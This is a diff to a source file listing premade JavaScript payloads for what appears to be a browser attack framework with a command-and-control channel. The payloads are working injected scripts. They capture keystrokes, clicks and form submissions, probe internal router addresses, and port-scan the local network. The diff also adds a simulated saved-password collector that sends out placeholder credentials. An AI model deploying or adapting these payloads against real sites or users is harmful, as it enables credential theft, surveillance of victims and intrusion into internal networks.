@@ -149,7 +149,7 @@ export const PREMADE_PAYLOADS: JsPayload[] = [
     },
     {
         name: "Full Recon Payload",
-        description: "The default payload that captures keystrokes, clicks, mouse movement, and form submissions.",
+        description: "The default payload that captures keystrokes, clicks, and form submissions.",
         code: `
 (function() {
     const channel = new BroadcastChannel('netrax_c2_channel');
@@ -172,14 +172,6 @@ export const PREMADE_PAYLOADS: JsPayload[] = [
     document.addEventListener('click', (e) => {
         exfiltrate('click', { x: e.clientX, y: e.clientY, target: e.target.innerText ? e.target.innerText.substring(0, 50) : e.target.tagName });
     }, true);
-
-    let lastMove = 0;
-    document.addEventListener('mousemove', (e) => {
-        if (Date.now() - lastMove > 200) {
-            exfiltrate('mousemove', { x: e.clientX, y: e.clientY });
-            lastMove = Date.now();
-        }
-    });
 
     document.addEventListener('submit', (e) => {
         const formData = new FormData(e.target);
@@ -403,10 +395,10 @@ export const PREMADE_PAYLOADS: JsPayload[] = [
         channel.postMessage({ sessionId, type, data, timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent });
     }
 
-    const ipsToScan = ['192.168.1.1', '192.168.0.1', '10.0.0.1'];
+    const ipsToScan = ['192.168.1.1', '192.168.0.1', '10.0.0.1', '192.168.1.254'];
     ipsToScan.forEach(ip => {
         const img = new Image();
-        img.src = \`http://\${ip}\`;
+        img.src = 'http://' + ip;
         img.onload = () => exfiltrate('internal-ip-found', { ip });
         img.onerror = () => { /* Do nothing on error */ };
     });
@@ -437,7 +429,7 @@ export const PREMADE_PAYLOADS: JsPayload[] = [
                 exfiltrate('port-scan-result', { target, port });
             }
         };
-        img.src = \`http://\${target}:\${port}\`;
+        img.src = 'http://' + target + ':' + port;
     });
 })();
 `.trim(),
@@ -598,6 +590,29 @@ export const PREMADE_PAYLOADS: JsPayload[] = [
             }
         });
     });
+})();
+`.trim(),
+    },
+    {
+        name: "Saved Password Collector (Simulation)",
+        description: "Simulates accessing saved credentials from a browser's password manager.",
+        code: `
+(function() {
+    const channel = new BroadcastChannel('netrax_c2_channel');
+    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
+    function exfiltrate(type, data) {
+        channel.postMessage({ sessionId, type, data, timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent });
+    }
+
+    // NOTE: Direct access to saved passwords from JavaScript is not possible due to browser security.
+    // This is a simulation of what an attacker would see if they could dump them.
+    const fakeSavedPasswords = [
+        { origin: "https://example-social.com", username: "user@example.com", password: "Password123!" },
+        { origin: "https://corp-internal-portal.net", username: "admin", password: "CorpPassword!@#" },
+        { origin: "https://code-repo.io", username: "dev_user", password: "supersecretgittoken" },
+    ];
+    
+    exfiltrate('saved-passwords', { passwords: fakeSavedPasswords });
 })();
 `.trim(),
     }
